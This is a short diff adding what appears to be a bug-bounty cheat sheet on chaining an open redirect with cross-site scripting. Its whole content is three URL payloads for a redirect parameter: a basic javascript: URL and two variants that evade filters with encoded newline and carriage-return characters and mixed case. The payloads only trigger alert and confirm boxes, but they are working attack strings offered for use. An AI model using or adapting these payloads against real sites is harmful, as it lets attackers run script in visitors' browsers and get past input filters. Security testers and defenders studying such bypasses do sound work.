@@ -1,0 +1,10 @@
+Chain open redirect with XSS
+
+Basic
+https://site.com/?redirect=javascript:alert(1)
+
+Not working? Bypass it
+https://site.com/?redirect=javascript://%250Aalert(1)
+
+Not working again? Bypass again
+https://site.com/?redirect=JavaScript://%250Dtop.confirm(1)//?1
